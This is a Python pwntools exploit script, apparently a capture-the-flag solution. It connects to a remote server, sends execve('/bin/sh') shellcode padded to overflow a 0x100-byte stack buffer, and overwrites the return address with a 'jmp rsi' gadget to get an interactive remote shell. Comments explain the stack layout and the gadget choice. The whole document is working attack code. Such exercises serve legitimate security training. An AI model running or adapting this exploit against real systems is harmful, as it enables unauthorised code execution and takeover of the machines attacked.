from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Connect to the remote server
p = remote('154.57.164.82', 30412)

# Receive the first message
print(p.recvuntil(b'?\n'))

# Shellcode to execve("/bin/sh", NULL, NULL)
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
''')

print(f"Shellcode length: {len(shellcode)}")

# Buffer is 0x100 bytes, and after `add rsp, 0x100` and `retn`
# The return address is at offset 0x100 from the buffer start
# After returning from read, rsp points right after the return address
# 
# Stack layout in read():
#   rsp+0x000: buffer (0x100 bytes)
#   rsp+0x100: return address (after add rsp, 0x100)
#
# After read() returns, execution goes to the return address
# We need to jump back to the buffer on the stack
# 
# When read syscall happens:
#   - rsi = rsp (the buffer)
#   - We can use rsp directly after the syscall
#
# After the syscall in read(), rax contains number of bytes read
# rsi still points to the buffer (rsp at that moment)
# 
# We can jump to rsi which still contains the buffer address!

# The trick: after syscall, RSI still points to our buffer
# We need to find a "jmp rsi" or "call rsi" gadget
# Or we can use the fact that after read, we return and RSP is known

# Looking at the code more carefully:
# In read proc:
#   sub rsp, 100h
#   ...
#   lea rsi, [rsp+100h+buf]  ; this is lea rsi, [rsp] since buf = -100h
#   syscall
#   add rsp, 100h
#   retn
#
# So rsi = rsp (buffer address) after syscall
# After add rsp, 100h - rsp now points to return address
# After retn - we control execution

# Key insight: after read syscall, rsi contains the buffer address
# We need a "jmp rsi" gadget
# Let's check what we have in the binary

# At 0x401041: jmp rsi  (this is in _start!)
# mov rsi, offset exit
# jmp rsi

# We can use 0x401041 as our return address to jump to rsi (our shellcode)

jmp_rsi = 0x401041

# Payload: shellcode + padding + return address (jmp rsi)
payload = shellcode
payload += b'A' * (0x100 - len(shellcode))  # Pad to 0x100 bytes
payload += p64(jmp_rsi)  # Return address -> jmp rsi

print(f"Payload length: {len(payload)}")

p.send(payload)

# Get shell
p.interactive()
